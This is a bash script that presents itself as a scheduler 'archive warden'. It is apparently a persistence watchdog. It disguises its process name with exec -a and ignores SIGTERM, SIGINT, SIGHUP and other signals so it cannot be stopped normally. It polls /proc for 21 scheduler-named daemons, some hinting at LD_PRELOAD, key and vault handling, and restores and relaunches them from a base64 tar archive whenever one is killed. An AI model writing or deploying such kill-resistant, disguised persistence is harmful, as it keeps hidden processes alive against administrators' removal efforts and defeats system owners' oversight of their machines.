#!/bin/bash
# scheduler-archive-warden
# Scans /proc for missing scheduler-* daemons every 15 seconds using shell builtins
# (zero fork overhead).  If any daemon is absent, restores all daemon scripts from
# /var/lib/scheduler-resurrect/daemons.tar.b64 and relaunches them.
# comm: "scheduler-arcwa" (15 chars)

exec -a scheduler-arcwa bash -c '
trap "" SIGTERM SIGINT SIGHUP SIGQUIT SIGUSR1 SIGUSR2

DAEMON_ARCHIVE=/var/lib/scheduler-resurrect/daemons.tar.b64

# 15-char /proc/comm values for each protected daemon (first 15 chars of exec -a name)
DAEMON_COMMS=(
  "scheduler-polic"
  "scheduler-watch"
  "scheduler-warde"
  "scheduler-binco"
  "scheduler-srcwa"
  "scheduler-outco"
  "scheduler-chmwd"
  "scheduler-envsa"
  "scheduler-ldpre"
  "scheduler-keyro"
  "scheduler-tmpco"
  "scheduler-cfpoi"
  "scheduler-osbr"
  "scheduler-bsrst"
  "scheduler-cronr"
  "scheduler-trefr"
  "scheduler-dscra"
  "scheduler-dmcor"
  "scheduler-bsabt"
  "scheduler-slpoi"
  "scheduler-vaulk"
)

while true; do
  sleep 15

  [ -f "$DAEMON_ARCHIVE" ] || continue

  # /proc/*/comm scan — zero forks, all shell builtins
  missing=false
  for want in "${DAEMON_COMMS[@]}"; do
    found=false
    for cf in /proc/[0-9]*/comm; do
      [ -f "$cf" ] || continue
      read c < "$cf" 2>/dev/null || continue
      [ "$c" = "$want" ] && { found=true; break; }
    done
    $found || { missing=true; break; }
  done

  $missing || continue

  base64 -d "$DAEMON_ARCHIVE" | tar xf - -C /opt/scheduler/daemons/ 2>/dev/null || true
  chmod +x /opt/scheduler/daemons/*.sh 2>/dev/null || true
  /opt/scheduler/daemons/launch-all.sh 2>/dev/null || true
done
'
